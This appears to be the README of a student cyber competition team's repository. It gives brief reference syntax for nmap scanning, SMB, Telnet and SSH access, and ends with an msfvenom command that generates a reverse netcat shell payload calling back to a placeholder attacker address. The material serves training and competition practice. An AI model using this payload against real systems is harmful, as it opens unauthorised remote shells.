# A Public Repository for the UAT Cyber Competition Team
The folders represent various scripts and resources applicable to individual members or subject areas to support Blue or Red team operations.  The guidance below is for quick reference and will continue to evolve as we develop use-cases.
> ### Using any of the resources within this repository without proper permission by the target network owner will likely be illegal.  These resources are for educational purposes only. 

## RECONNAISSANCE
### Enumeration (Active Recon)
#### Network Enumeration
The first step in evaluating a target network is to identify open ports and active services.

NMAP Commands\
nmap [flag(s)] [target/file]



References:\
[Try Hack Me NMAP room](https://tryhackme.com/r/room/furthernmap)\
[NMAP Cheat Sheet All Commands & Flags Nathan House](https://www.stationx.net/nmap-cheat-sheet/)


## ACCESS
[An overview of SMB, Telnet, SSH and FTP](https://chatgpt.com/share/3a9c17c6-db6d-48b6-ae75-a3d976bdfd4f)

SMB Commands:
```zsh
smbclient //[ip]/[share] -U [userName] -p [port]
```
Telnet Commands:
```zsh
telnet [ip] [port]
```
SSH Commands:
```zsh
ssh username@IP
```
FTP Commands:

## EXPLOITATION

Reverse Shell:\
Obtain your lhost from the terminal using ifconfig or ip a

Obtaining a reverse shell payload:\
```zsh
msfvenom -p cmd/unix/reverse_netcat lhost=xx.xx.xx.xx lport=4444 R
```
